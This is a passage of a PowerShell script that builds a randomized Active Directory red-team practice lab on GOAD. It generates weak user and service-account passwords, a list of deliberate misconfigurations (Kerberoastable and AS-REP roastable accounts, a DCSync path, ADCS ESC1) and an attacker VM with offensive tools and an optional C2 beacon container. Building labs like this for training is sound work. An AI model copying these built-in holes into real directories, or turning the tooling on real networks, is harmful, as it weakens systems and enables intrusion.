<#
.SYNOPSIS
    Insta-Internal-Labinator — One-click Red Team Assumed-Breach Lab Generator
.DESCRIPTION
    Deploys a fully randomized internal penetration test lab using GOAD (Game of Active Directory)
    on VMware Workstation Pro with an attacker VM, then generates a professional Red Team Handoff Package.
.NOTES
    Requires: Windows 11 Pro, VMware Workstation Pro, Vagrant, Git, PowerShell 5.1+
    Run elevated (Administrator).
    Author: Insta-Internal-Labinator Project
    Version: 1.0.0
#>

#Requires -RunAsAdministrator
#Requires -Version 5.1

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$ConfigPath = ".\ClientHandoff.json",

    [Parameter(Mandatory = $false)]
    [switch]$Destroy,

    [Parameter(Mandatory = $false)]
    [switch]$SkipSnapshots,

    [Parameter(Mandatory = $false)]
    [switch]$Force
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# ─── CONSTANTS ──────────────────────────────────────────────────────────────────
$SCRIPT_VERSION  = "1.0.0"
$SCRIPT_DIR      = Split-Path -Parent $MyInvocation.MyCommand.Definition
$GOAD_REPO       = "https://github.com/Orange-Cyberdefense/GOAD.git"
$GOAD_DIR        = Join-Path $SCRIPT_DIR "GOAD"
$LOG_DIR         = Join-Path $SCRIPT_DIR "logs"
$LOG_FILE        = Join-Path $LOG_DIR "deploy-$(Get-Date -Format 'yyyyMMdd-HHmmss').log"
$VMRUN           = ""  # resolved at runtime
$VMWARE_NETCFG   = "" # resolved at runtime

# RAM budget — keep under 24 GB for 32 GB host
$RAM_BUDGET_MB   = 24576

# ─── LOGGING ────────────────────────────────────────────────────────────────────
function Initialize-Logging {
    if (-not (Test-Path $LOG_DIR)) { New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null }
    Start-Transcript -Path $LOG_FILE -Append -Force | Out-Null
}

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$ts][$Level] $Message"
    switch ($Level) {
        "ERROR"   { Write-Host $line -ForegroundColor Red }
        "WARN"    { Write-Host $line -ForegroundColor Yellow }
        "SUCCESS" { Write-Host $line -ForegroundColor Green }
        "BANNER"  { Write-Host $line -ForegroundColor Cyan }
        default   { Write-Host $line -ForegroundColor Gray }
    }
}

function Write-Banner {
    param([string]$Text)
    $border = "=" * 80
    Write-Host ""
    Write-Host $border -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Cyan
    Write-Host $border -ForegroundColor Cyan
    Write-Host ""
}

# ─── RANDOMIZATION ENGINE ───────────────────────────────────────────────────────

function Get-RandomElement {
    param([array]$Array)
    return $Array | Get-Random
}

function New-RandomDomain {
    $prefixes = @(
        "acmecorp", "globexinc", "initech", "umbrellaco", "wayneindustries",
        "starkindustries", "oscorp", "lexcorp", "cyberdyne", "massivetech",
        "pinnacle", "silverline", "northgate", "blueridge", "crestwood",
        "meridian", "vanguardgroup", "summitfinancial", "ironclad", "nexgenhealth",
        "primelogistics", "atlashq", "beacontech", "corestone", "deltaforce",
        "eaglepoint", "frontierdata", "graniteworks", "horizonit", "keystonegrp"
    )
    $suffixes = @(".local", ".internal", ".corp", ".lan", ".ad")
    $prefix = Get-RandomElement $prefixes
    $suffix = Get-RandomElement $suffixes
    return "$prefix$suffix"
}

function New-RandomCompanyName {
    $names = @(
        "Acme Corporation", "Globex International", "Initech Solutions",
        "Umbrella Holdings", "Wayne Enterprises", "Stark Industries",
        "Oscorp Technologies", "Pinnacle Group", "Silverline Partners",
        "Northgate Systems", "Blue Ridge Financial", "Crestwood Analytics",
        "Meridian Health Corp", "Vanguard Group Inc", "Summit Financial",
        "Ironclad Security", "NexGen Health Systems", "Prime Logistics",
        "Atlas Headquarters", "Beacon Technologies", "Corestone Capital",
        "Delta Force Defense", "Eagle Point Ventures", "Frontier Data Inc",
        "Granite Works LLC", "Horizon IT Services", "Keystone Group"
    )
    return Get-RandomElement $names
}

function New-RandomCIDR {
    $cidrs = @(
        "192.168.56.0/24", "192.168.100.0/24", "192.168.50.0/24",
        "10.10.10.0/24", "10.0.50.0/24", "10.100.100.0/24",
        "172.16.100.0/24", "172.16.50.0/24", "172.16.200.0/24"
    )
    return Get-RandomElement $cidrs
}

function New-RandomUsername {
    $patterns = @(
        { $fnames = @("john","jane","mike","sarah","david","emma","chris","alex","pat","sam","taylor","morgan","casey","jordan","riley")
          $lnames = @("smith","johnson","williams","brown","jones","garcia","miller","davis","wilson","moore","taylor","anderson","thomas","jackson","white")
          $f = Get-RandomElement $fnames; $l = Get-RandomElement $lnames
          return (Get-RandomElement @("$($f[0]).$l", "$($f[0])$l", "$f.$l", "${f}_${l}"))
        },
        { $svcs = @("svc_backup","svc_sql","svc_web","svc_print","svc_scan","svc_deploy","svc_monitor","svc_report")
          return Get-RandomElement $svcs
        },
        { $prefix = Get-RandomElement @("temp","contractor","vendor","helpdesk","intern")
          $year = Get-Random -Minimum 2024 -Maximum 2027
          return "${prefix}${year}"
        }
    )
    $gen = Get-RandomElement $patterns
    return (& $gen)
}

function New-RandomWeakPassword {
    $bases = @(
        "Password", "Welcome", "Summer", "Winter", "Spring", "Autumn",
        "Company", "Changeme", "Letmein", "Qwerty", "Admin", "Monday",
        "Friday", "January", "March", "P@ssw0rd"
    )
    $years = @("2024", "2025", "2026", "2025!", "2026!", "123", "1!", "!")
    $base = Get-RandomElement $bases
    $year = Get-RandomElement $years
    return "$base$year"
}

function New-RandomADUsers {
    param([int]$Min = 50, [int]$Max = 300)
    $count = Get-Random -Minimum $Min -Maximum ($Max + 1)
    $users = @()
    $weakRatio = (Get-Random -Minimum 15 -Maximum 35) / 100.0  # 15-35% weak passwords

    $fnames = @("john","jane","mike","sarah","david","emma","chris","alex","pat","sam",
                "taylor","morgan","casey","jordan","riley","avery","drew","cameron",
                "parker","logan","reese","blake","quinn","skyler","charlie","frankie",
                "jamie","robin","terry","lee","dana","kelly","jesse","tracy","gene")
    $lnames = @("smith","johnson","williams","brown","jones","garcia","miller","davis",
                "wilson","moore","taylor","anderson","thomas","jackson","white","harris",
                "martin","thompson","robinson","clark","lewis","walker","hall","allen",
                "young","king","wright","scott","green","baker","adams","nelson","hill")
    $depts  = @("IT","Finance","HR","Engineering","Sales","Marketing","Legal","Operations","Executive","Support")
    $titles = @("Analyst","Manager","Specialist","Coordinator","Administrator","Engineer","Director","Associate","Consultant","Technician")

    $usedNames = @{}
    for ($i = 0; $i -lt $count; $i++) {
        $fname = Get-RandomElement $fnames
        $lname = Get-RandomElement $lnames
        $uname = (Get-RandomElement @("$($fname[0]).$lname", "$($fname[0])$lname", "$fname.$lname")).ToLower()

        # Deduplicate
        if ($usedNames.ContainsKey($uname)) {
            $uname = "$uname$(Get-Random -Minimum 1 -Maximum 99)"
        }
        $usedNames[$uname] = $true

        $isWeak = ([float](Get-Random -Minimum 0 -Maximum 100) / 100.0) -lt $weakRatio
        $pw = if ($isWeak) { New-RandomWeakPassword } else {
            # Strong-ish password (still crackable but not trivially guessable)
            $chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#%"
            -join (1..14 | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
        }

        $users += [PSCustomObject]@{
            Username   = $uname
            Password   = $pw
            FirstName  = (Get-Culture).TextInfo.ToTitleCase($fname)
            LastName   = (Get-Culture).TextInfo.ToTitleCase($lname)
            Department = Get-RandomElement $depts
            Title      = Get-RandomElement $titles
            WeakPW     = $isWeak
        }
    }
    return $users
}

function New-RandomServiceAccounts {
    $services = @(
        @{ Name = "svc_sqlserver";  SPN = "MSSQLSvc";    Desc = "SQL Server service account" },
        @{ Name = "svc_http";      SPN = "HTTP";         Desc = "IIS web service account" },
        @{ Name = "svc_backup";    SPN = "backupexec";   Desc = "Backup Exec service" },
        @{ Name = "svc_sharepoint"; SPN = "HTTP";        Desc = "SharePoint farm account" },
        @{ Name = "svc_exchange";  SPN = "exchangeMDB";  Desc = "Exchange mailbox service" },
        @{ Name = "svc_scanner";   SPN = "vncscan";      Desc = "Vulnerability scanner service" }
    )
    $count = Get-Random -Minimum 2 -Maximum ($services.Count + 1)
    $selected = $services | Get-Random -Count $count
    foreach ($svc in $selected) {
        $svc["Password"] = New-RandomWeakPassword  # Kerberoastable!
    }
    return $selected
}

function New-RandomMisconfigurations {
    # Return a seed object that describes which misconfigs to inject
    $misconfigs = @(
        @{ Id = "UNCONSTRAINED_DELEG"; Description = "Unconstrained delegation on a server"; Probability = 0.8 },
        @{ Id = "CONSTRAINED_DELEG";   Description = "Constrained delegation to DC"; Probability = 0.6 },
        @{ Id = "ASREP_ROAST";         Description = "AS-REP roastable accounts (no preauth)"; Probability = 0.9 },
        @{ Id = "KERBEROAST";          Description = "Kerberoastable service accounts with weak passwords"; Probability = 0.95 },
        @{ Id = "GPP_PASSWORDS";       Description = "Group Policy Preferences with stored credentials"; Probability = 0.7 },
        @{ Id = "LAPS_MISSING";        Description = "LAPS not deployed on workstations"; Probability = 0.6 },
        @{ Id = "SMB_SIGNING_OFF";     Description = "SMB signing not required"; Probability = 0.75 },
        @{ Id = "LLMNR_ENABLED";       Description = "LLMNR/NBT-NS enabled"; Probability = 0.85 },
        @{ Id = "DCSYNC_PATH";         Description = "ACL path to DCSync via group nesting"; Probability = 0.5 },
        @{ Id = "WEAK_ACL";            Description = "GenericAll/WriteDACL on privileged objects"; Probability = 0.7 },
        @{ Id = "PRINTSPOOLER";        Description = "Print Spooler service running on DC"; Probability = 0.8 },
        @{ Id = "ADCS_ESC1";           Description = "ADCS misconfigured template (ESC1)"; Probability = 0.4 }
    )

    $active = @()
    foreach ($mc in $misconfigs) {
        if ((Get-Random -Minimum 0.0 -Maximum 1.0) -le $mc.Probability) {
            $active += $mc
        }
    }
    return $active
}

# ─── PREREQUISITE CHECKS ────────────────────────────────────────────────────────

function Test-Prerequisites {
    Write-Banner "CHECKING PREREQUISITES"

    $errors = @()

    # VMware Workstation
    $vmwarePaths = @(
        "${env:ProgramFiles(x86)}\VMware\VMware Workstation",
        "$env:ProgramFiles\VMware\VMware Workstation"
    )
    $script:VMRUN = $null
    foreach ($p in $vmwarePaths) {
        $vmrunPath = Join-Path $p "vmrun.exe"
        if (Test-Path $vmrunPath) {
            $script:VMRUN = $vmrunPath
            $script:VMWARE_NETCFG = Join-Path $p "vmnetcfg.exe"
            break
        }
    }
    if (-not $script:VMRUN) {
        # Try PATH
        $vmrunCmd = Get-Command vmrun.exe -ErrorAction SilentlyContinue
        if ($vmrunCmd) { $script:VMRUN = $vmrunCmd.Source }
        else { $errors += "VMware Workstation not found. Install VMware Workstation Pro." }
    }
    if ($script:VMRUN) { Write-Log "VMware vmrun: $($script:VMRUN)" "SUCCESS" }

    # Vagrant
    $vagrant = Get-Command vagrant -ErrorAction SilentlyContinue
    if (-not $vagrant) { $errors += "Vagrant not found. Install from https://www.vagrantup.com/" }
    else { Write-Log "Vagrant: $($vagrant.Source)" "SUCCESS" }

    # Git
    $git = Get-Command git -ErrorAction SilentlyContinue
    if (-not $git) { $errors += "Git not found. Install from https://git-scm.com/" }
    else { Write-Log "Git: $($git.Source)" "SUCCESS" }

    # Vagrant VMware plugin
    if ($vagrant) {
        $plugins = & vagrant plugin list 2>&1
        if ($plugins -notmatch "vagrant-vmware-desktop") {
            Write-Log "Installing vagrant-vmware-desktop plugin..." "WARN"
            & vagrant plugin install vagrant-vmware-desktop 2>&1
            if ($LASTEXITCODE -ne 0) { $errors += "Failed to install vagrant-vmware-desktop plugin" }
        }
        Write-Log "Vagrant VMware plugin: OK" "SUCCESS"
    }

    # SSH
    $ssh = Get-Command ssh -ErrorAction SilentlyContinue
    if (-not $ssh) { $errors += "SSH client not found. Enable OpenSSH Client in Windows Features." }
    else { Write-Log "SSH: $($ssh.Source)" "SUCCESS" }

    # RAM check
    $totalRAM = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1MB)
    Write-Log "Total system RAM: ${totalRAM} MB" "INFO"
    if ($totalRAM -lt 28000) {
        $errors += "Less than 28 GB RAM detected ($totalRAM MB). Recommended: 32 GB."
    }

    if ($errors.Count -gt 0) {
        Write-Banner "PREREQUISITE FAILURES"
        foreach ($e in $errors) { Write-Log $e "ERROR" }
        throw "Prerequisites not met. Fix the above issues and re-run."
    }

    Write-Log "All prerequisites passed." "SUCCESS"
}

# ─── CONFIG LOADING & MERGING ────────────────────────────────────────────────────

function Read-ClientConfig {
    param([string]$Path)

    $config = @{
        clientName    = ""
        domain        = ""
        cidr          = ""
        lowPrivUser   = @{ username = ""; password = "" }
        c2DockerImage = ""
        c2EnvVars     = @{}
        labVariant    = "GOAD-Light"
        attackerVm    = @{
            sshPort   = 22
            ramMB     = 4096
            cpus      = 2
        }
    }

    if (Test-Path $Path) {
        Write-Log "Loading client config from: $Path"
        $json = Get-Content -Path $Path -Raw | ConvertFrom-Json
        # Merge provided fields
        if ($json.clientName)    { $config.clientName = $json.clientName }
        if ($json.domain)        { $config.domain = $json.domain }
        if ($json.cidr)          { $config.cidr = $json.cidr }
        if ($json.lowPrivUser) {
            if ($json.lowPrivUser.username) { $config.lowPrivUser.username = $json.lowPrivUser.username }
            if ($json.lowPrivUser.password) { $config.lowPrivUser.password = $json.lowPrivUser.password }
        }
        if ($json.c2DockerImage) { $config.c2DockerImage = $json.c2DockerImage }
        if ($json.c2EnvVars) {
            $json.c2EnvVars.PSObject.Properties | ForEach-Object {
                $config.c2EnvVars[$_.Name] = $_.Value
            }
        }
        if ($json.labVariant)    { $config.labVariant = $json.labVariant }
        if ($json.attackerVm) {
            if ($json.attackerVm.ramMB) { $config.attackerVm.ramMB = $json.attackerVm.ramMB }
            if ($json.attackerVm.cpus)  { $config.attackerVm.cpus = $json.attackerVm.cpus }
        }
    }
    else {
        Write-Log "No config file at $Path — generating fully randomized lab." "WARN"
    }

    # Fill in missing fields with randomized values
    if (-not $config.clientName)          { $config.clientName = New-RandomCompanyName }
    if (-not $config.domain)              { $config.domain = New-RandomDomain }
    if (-not $config.cidr)                { $config.cidr = New-RandomCIDR }
    if (-not $config.lowPrivUser.username) { $config.lowPrivUser.username = New-RandomUsername }
    if (-not $config.lowPrivUser.password) { $config.lowPrivUser.password = New-RandomWeakPassword }

    return $config
}

# ─── NETWORK HELPERS ─────────────────────────────────────────────────────────────

function Get-NetworkFromCIDR {
    param([string]$CIDR)
    $parts = $CIDR -split "/"
    $ip = $parts[0]
    $mask = [int]$parts[1]
    $octets = $ip -split "\."
    return @{
        Network  = $ip
        Prefix   = $mask
        Gateway  = "$($octets[0]).$($octets[1]).$($octets[2]).1"
        DCStart  = "$($octets[0]).$($octets[1]).$($octets[2]).10"
        Attacker = "$($octets[0]).$($octets[1]).$($octets[2]).200"
        Subnet   = "$($octets[0]).$($octets[1]).$($octets[2])"
        Netmask  = if ($mask -eq 24) { "255.255.255.0" } elseif ($mask -eq 16) { "255.255.0.0" } else { "255.255.255.0" }
    }
}

function Initialize-VMwareNetwork {
    param(
        [hashtable]$NetInfo,
        [string]$CIDR
    )
    Write-Banner "CONFIGURING VMWARE HOST-ONLY NETWORK"

    # Find an available vmnet (vmnet2-vmnet19)
    $vmnetDir = "$env:ProgramData\VMware"
    $usedNets = @()
    if (Test-Path "$vmnetDir\vmnetnat.conf") {
        $usedNets += (Select-String -Path "$vmnetDir\vmnetnat.conf" -Pattern "vmnet\d+" -AllMatches).Matches.Value
    }

    $targetVmnet = $null
    for ($i = 2; $i -le 19; $i++) {
        $candidate = "vmnet$i"
        if ($candidate -notin $usedNets -or $i -eq 2) {
            $targetVmnet = $candidate
            break
        }
    }
    if (-not $targetVmnet) { $targetVmnet = "vmnet2" }

    Write-Log "Using VMware network: $targetVmnet for CIDR $CIDR"

    # Configure via VMware Virtual Network Editor CLI or registry
    # VMware stores config in: C:\ProgramData\VMware\vmnetX.conf
    # For modern VMware Workstation, we use vmnetcfg or direct config

    $vmnetConfDir = "$env:ProgramData\VMware"
    $answerFile = Join-Path $SCRIPT_DIR "vmnet-config.txt"

    # Write VMware network configuration
    $vmnetConf = @"
# Insta-Internal-Labinator VMware Network Config
# Network: $targetVmnet
# CIDR: $CIDR
# Type: Host-Only, No DHCP
VNET_${targetVmnet}_HOSTONLY_SUBNET=$($NetInfo.Network)
VNET_${targetVmnet}_HOSTONLY_NETMASK=$($NetInfo.Netmask)
VNET_${targetVmnet}_DHCP=no
VNET_${targetVmnet}_VIRTUAL_ADAPTER=yes
"@
    Set-Content -Path $answerFile -Value $vmnetConf -Force
    Write-Log "VMware network config written to $answerFile"

    # Try to apply via vmnetcfg.exe if available, otherwise use vnetlib
    $vnetlib = Join-Path (Split-Path $script:VMRUN -Parent) "vnetlib64.exe"
    if (Test-Path $vnetlib) {
        Write-Log "Configuring $targetVmnet via vnetlib64..."
        $vmnetNum = $targetVmnet -replace "vmnet", ""

        # Stop networking
        & $vnetlib -- stop dhcp 2>$null
        & $vnetlib -- stop nat 2>$null

        # Configure the host-only network
        & $vnetlib -- set vnet $targetVmnet mask $($NetInfo.Netmask) 2>&1 | ForEach-Object { Write-Log $_ }
        & $vnetlib -- set vnet $targetVmnet addr $($NetInfo.Network) 2>&1 | ForEach-Object { Write-Log $_ }
        & $vnetlib -- set vnet $targetVmnet type hostonly 2>&1 | ForEach-Object { Write-Log $_ }

        # Disable DHCP
        & $vnetlib -- remove dhcp $targetVmnet 2>&1 | ForEach-Object { Write-Log $_ }

        # Restart networking
        & $vnetlib -- start dhcp 2>$null
        & $vnetlib -- start nat 2>$null

        Write-Log "$targetVmnet configured: $CIDR (Host-Only, No DHCP)" "SUCCESS"
    }
    else {
        Write-Log "vnetlib64.exe not found — manual VMware Virtual Network Editor configuration may be needed." "WARN"
        Write-Log "Required settings for $targetVmnet :" "WARN"
        Write-Log "  Type: Host-Only" "WARN"
        Write-Log "  Subnet: $($NetInfo.Network)" "WARN"
        Write-Log "  Mask: $($NetInfo.Netmask)" "WARN"
        Write-Log "  DHCP: Disabled" "WARN"
    }

    return $targetVmnet
}

# ─── GOAD DEPLOYMENT ─────────────────────────────────────────────────────────────

function Deploy-GOAD {
    param(
        [hashtable]$Config,
        [hashtable]$NetInfo,
        [string]$VMnet,
        [array]$ADUsers,
        [array]$ServiceAccounts,
        [array]$Misconfigs
    )
    Write-Banner "DEPLOYING GOAD ($($Config.labVariant))"

    # Clone GOAD if not present
    if (-not (Test-Path $GOAD_DIR)) {
        Write-Log "Cloning GOAD repository..."
        & git clone --depth 1 $GOAD_REPO $GOAD_DIR 2>&1 | ForEach-Object { Write-Log $_ }
        if ($LASTEXITCODE -ne 0) { throw "Failed to clone GOAD repository" }
        Write-Log "GOAD cloned successfully." "SUCCESS"
    }
    else {
        Write-Log "GOAD directory exists, pulling latest..." "INFO"
        Push-Location $GOAD_DIR
        & git pull 2>&1 | ForEach-Object { Write-Log $_ }
        Pop-Location
    }

    # Determine lab path
    $labVariant = $Config.labVariant
    $labPath = Join-Path $GOAD_DIR "ad" $labVariant
    if (-not (Test-Path $labPath)) {
        Write-Log "Lab variant '$labVariant' not found, falling back to GOAD-Light..." "WARN"
        $labVariant = "GOAD-Light"
        $labPath = Join-Path $GOAD_DIR "ad" $labVariant
        if (-not (Test-Path $labPath)) {
            # Try alternate path structures
            $labPath = Join-Path $GOAD_DIR "ad" "GOAD-Light"
            if (-not (Test-Path $labPath)) {
                throw "Cannot find GOAD lab variant directory. Check GOAD repository structure."
            }
        }
    }

    Write-Log "Lab path: $labPath"

    # ── Inject custom configuration into GOAD ──
    $providerPath = Join-Path $labPath "providers" "vmware"
    if (-not (Test-Path $providerPath)) {
        $providerPath = Join-Path $labPath "providers" "virtualbox"
        Write-Log "VMware provider not found in GOAD, adapting VirtualBox config..." "WARN"
    }

    # Modify Vagrantfile for our network
    $vagrantFiles = Get-ChildItem -Path $labPath -Recurse -Filter "Vagrantfile" | Select-Object -First 1
    if ($vagrantFiles) {
        Write-Log "Customizing Vagrantfile with lab network settings..."
        $vfContent = Get-Content $vagrantFiles.FullName -Raw

        # Inject custom network — replace IP references
        # GOAD typically uses 192.168.56.x by default
        $defaultSubnet = "192.168.56"
        $newSubnet = $NetInfo.Subnet

        if ($newSubnet -ne $defaultSubnet) {
            $vfContent = $vfContent -replace [regex]::Escape($defaultSubnet), $newSubnet
            Write-Log "Replaced subnet $defaultSubnet -> $newSubnet"
        }

        # Replace vmnet if present
        $vfContent = $vfContent -replace "vmnet\d+", $VMnet

        Set-Content -Path $vagrantFiles.FullName -Value $vfContent -Force
        Write-Log "Vagrantfile customized." "SUCCESS"
    }

    # ── Inject custom AD users via Ansible variables ──
    $ansiblePath = Join-Path $GOAD_DIR "ansible"
    $customVarsDir = Join-Path $SCRIPT_DIR "custom-ansible-vars"
    if (-not (Test-Path $customVarsDir)) { New-Item -ItemType Directory -Path $customVarsDir -Force | Out-Null }

    # Generate custom users YAML
    $usersYaml = "---`n# Auto-generated by Insta-Internal-Labinator`n# Client: $($Config.clientName)`n# Domain: $($Config.domain)`n`ncustom_domain_users:`n"
    foreach ($u in $ADUsers) {
        $usersYaml += "  - name: `"$($u.Username)`"`n"
        $usersYaml += "    password: `"$($u.Password)`"`n"
        $usersYaml += "    firstname: `"$($u.FirstName)`"`n"
        $usersYaml += "    lastname: `"$($u.LastName)`"`n"
        $usersYaml += "    department: `"$($u.Department)`"`n"
        $usersYaml += "    title: `"$($u.Title)`"`n"
        $usersYaml += "    password_never_expires: $(if ($u.WeakPW) { 'true' } else { 'false' })`n"
        $usersYaml += "`n"
    }
    Set-Content -Path (Join-Path $customVarsDir "custom_users.yml") -Value $usersYaml -Force

    # Generate service accounts YAML (Kerberoastable)
    $svcYaml = "---`n# Kerberoastable service accounts`n`ncustom_service_accounts:`n"
    foreach ($svc in $ServiceAccounts) {
        $svcYaml += "  - name: `"$($svc.Name)`"`n"
        $svcYaml += "    password: `"$($svc.Password)`"`n"
        $svcYaml += "    spn: `"$($svc.SPN)`"`n"
        $svcYaml += "    description: `"$($svc.Desc)`"`n`n"
    }
    Set-Content -Path (Join-Path $customVarsDir "custom_services.yml") -Value $svcYaml -Force

    # Generate domain config override
    $domainParts = $Config.domain -split "\."
    $domainNetbios = $domainParts[0].ToUpper()
    $domainYaml = @"
---
# Domain configuration override
custom_domain:
  name: "$($Config.domain)"
  netbios: "$domainNetbios"
  dn: "DC=$($domainParts -join ',DC=')"
  initial_user: "$($Config.lowPrivUser.username)"
  initial_password: "$($Config.lowPrivUser.password)"
"@
    Set-Content -Path (Join-Path $customVarsDir "custom_domain.yml") -Value $domainYaml -Force

    # Generate misconfigurations manifest
    $misconfigYaml = "---`n# Active misconfigurations for this engagement`n`nactive_misconfigurations:`n"
    foreach ($mc in $Misconfigs) {
        $misconfigYaml += "  - id: `"$($mc.Id)`"`n"
        $misconfigYaml += "    description: `"$($mc.Description)`"`n"
        $misconfigYaml += "    enabled: true`n`n"
    }
    Set-Content -Path (Join-Path $customVarsDir "custom_misconfigs.yml") -Value $misconfigYaml -Force

    Write-Log "Custom Ansible variables generated in $customVarsDir" "SUCCESS"

    # ── Run Vagrant to provision GOAD VMs ──
    Write-Log "Starting GOAD VM provisioning (this will take 30-60 minutes)..." "WARN"

    Push-Location $providerPath
    try {
        # Check if VMs already exist
        $vagrantStatus = & vagrant status 2>&1
        if ($vagrantStatus -match "running") {
            if (-not $Force) {
                Write-Log "VMs already running. Use -Force to rebuild." "WARN"
                return
            }
            Write-Log "Force flag set — destroying existing VMs..." "WARN"
            & vagrant destroy -f 2>&1 | ForEach-Object { Write-Log $_ }
        }

        Write-Log "Running vagrant up..."
        & vagrant up 2>&1 | ForEach-Object { Write-Log $_ }
        if ($LASTEXITCODE -ne 0) {
            Write-Log "Vagrant up completed with warnings (exit code: $LASTEXITCODE)" "WARN"
        }
        else {
            Write-Log "GOAD VMs provisioned successfully!" "SUCCESS"
        }
    }
    finally {
        Pop-Location
    }

    # ── Run Ansible provisioning ──
    Write-Log "Running Ansible provisioning for AD configuration..."

    $ansibleInventory = Join-Path $providerPath "inventory"
    if (Test-Path $ansibleInventory) {
        # Set environment for custom vars
        $env:GOAD_CUSTOM_VARS = $customVarsDir

        # Look for provisioning script
        $provisionScript = Join-Path $GOAD_DIR "scripts" "provisionning.sh"
        if (-not (Test-Path $provisionScript)) {
            $provisionScript = Join-Path $GOAD_DIR "ansible" "provisioning.sh"
        }

        Write-Log "Ansible provisioning should be run from a Linux/WSL environment." "WARN"
        Write-Log "Custom variables are in: $customVarsDir" "INFO"
        Write-Log "Copy these to GOAD ansible/group_vars/ to inject custom users." "INFO"
    }
}

# ─── ATTACKER VM DEPLOYMENT ──────────────────────────────────────────────────────

function Deploy-AttackerVM {
    param(
        [hashtable]$Config,
        [hashtable]$NetInfo,
        [string]$VMnet
    )
    Write-Banner "DEPLOYING ATTACKER VM"

    $attackerDir = Join-Path $SCRIPT_DIR "attacker-vm"
    if (-not (Test-Path $attackerDir)) { New-Item -ItemType Directory -Path $attackerDir -Force | Out-Null }

    $attackerIP = $NetInfo.Attacker
    $attackerRAM = $Config.attackerVm.ramMB
    $attackerCPUs = $Config.attackerVm.cpus

    # Generate Vagrantfile for attacker VM
    $c2EnvLines = ""
    foreach ($key in $Config.c2EnvVars.Keys) {
        $val = $Config.c2EnvVars[$key]
        $c2EnvLines += "      echo '$key=$val' >> /opt/c2/.env`n"
    }

    $c2DockerBlock = ""
    if ($Config.c2DockerImage) {
        $c2DockerBlock = @"

      # ── C2 Docker Setup ──
      mkdir -p /opt/c2
      cat > /opt/c2/docker-compose.yml << 'COMPOSE'
version: '3.8'
services:
  c2-beacon:
    image: $($Config.c2DockerImage)
    container_name: c2-beacon
    restart: unless-stopped
    network_mode: host
    env_file:
      - .env
    volumes:
      - c2-data:/data
volumes:
  c2-data:
COMPOSE
      touch /opt/c2/.env
$c2EnvLines
      cd /opt/c2 && docker compose pull && docker compose up -d
"@
    }

    $vagrantContent = @"
# -*- mode: ruby -*-
# Insta-Internal-Labinator — Attacker VM
# Auto-generated on $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')

Vagrant.configure("2") do |config|
  config.vm.box = "bento/ubuntu-24.04"
  config.vm.hostname = "attacker"

  # Host-only NIC — same network as GOAD lab
  config.vm.network "private_network", ip: "$attackerIP", virtualbox__intnet: false

  # NAT NIC for internet access (C2 callbacks, updates)
  # Vagrant adds NAT adapter by default as adapter 1

  config.vm.provider "vmware_desktop" do |v|
    v.vmx["memsize"] = "$attackerRAM"
    v.vmx["numvcpus"] = "$attackerCPUs"
    v.vmx["displayName"] = "Attacker-VM-Labinator"
    v.vmx["ethernet1.present"] = "TRUE"
    v.vmx["ethernet1.connectionType"] = "custom"
    v.vmx["ethernet1.vnet"] = "$VMnet"
    v.vmx["ethernet1.addressType"] = "static"
    v.vmx["ethernet1.address"] = ""
    v.vmx["ethernet1.virtualDev"] = "e1000e"
  end

  config.vm.provision "shell", inline: <<-SHELL
    set -e
    export DEBIAN_FRONTEND=noninteractive

    echo "[*] Updating system..."
    apt-get update -qq
    apt-get upgrade -y -qq

    echo "[*] Installing core tools..."
    apt-get install -y -qq \
      docker.io docker-compose-v2 \
      net-tools iputils-ping dnsutils \
      nmap masscan crackmapexec \
      python3 python3-pip python3-venv \
      git curl wget jq unzip \
      smbclient ldap-utils \
      bloodhound neo4j \
      proxychains4 chisel \
      tmux vim htop

    # Enable Docker
    systemctl enable docker
    systemctl start docker
    usermod -aG docker vagrant

    # Configure static IP on lab interface
    cat > /etc/netplan/99-lab.yaml << 'NETPLAN'
network:
  version: 2
  ethernets:
    eth1:
      addresses:
        - $attackerIP/24
      routes: []
      dhcp4: false
NETPLAN
    netplan apply 2>/dev/null || true

    echo "[*] Installing Python pentesting tools..."
    python3 -m pip install --break-system-packages \
      impacket certipy-ad bloodhound ldapdomaindump \
      pycryptodomex minikerberos 2>/dev/null || true

    # Impacket from source for latest
    git clone --depth 1 https://github.com/fortra/impacket.git /opt/impacket 2>/dev/null || true
    cd /opt/impacket && python3 -m pip install --break-system-packages . 2>/dev/null || true

    echo "[*] Installing Kerbrute..."
    KERBRUTE_URL="https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64"
    wget -q "\$KERBRUTE_URL" -O /usr/local/bin/kerbrute 2>/dev/null && chmod +x /usr/local/bin/kerbrute || true

    echo "[*] Installing Ligolo-ng..."
    LIGOLO_URL=\$(curl -s https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | jq -r '.assets[] | select(.name | contains("linux_amd64")) | select(.name | contains("agent")) | .browser_download_url' | head -1)
    if [ -n "\$LIGOLO_URL" ]; then
      wget -q "\$LIGOLO_URL" -O /usr/local/bin/ligolo-agent 2>/dev/null && chmod +x /usr/local/bin/ligolo-agent || true
    fi

    echo "[*] Setting up Responder..."
    git clone --depth 1 https://github.com/lgandx/Responder.git /opt/Responder 2>/dev/null || true

    echo "[*] Setting up enum4linux-ng..."
    git clone --depth 1 https://github.com/cddmp/enum4linux-ng.git /opt/enum4linux-ng 2>/dev/null || true
    cd /opt/enum4linux-ng && python3 -m pip install --break-system-packages -r requirements.txt 2>/dev/null || true

    # NetExec (CrackMapExec successor)
    python3 -m pip install --break-system-packages netexec 2>/dev/null || true
$c2DockerBlock

    echo "[*] Creating engagement workspace..."
    mkdir -p /home/vagrant/engagement/{scans,loot,notes,bloodhound}
    chown -R vagrant:vagrant /home/vagrant/engagement

    # Write lab info
    cat > /home/vagrant/engagement/lab-info.txt << 'LABINFO'
=== Insta-Internal-Labinator ===
Domain: $($Config.domain)
Initial User: $($Config.lowPrivUser.username)
Lab Network: $($Config.cidr)
Attacker IP: $attackerIP
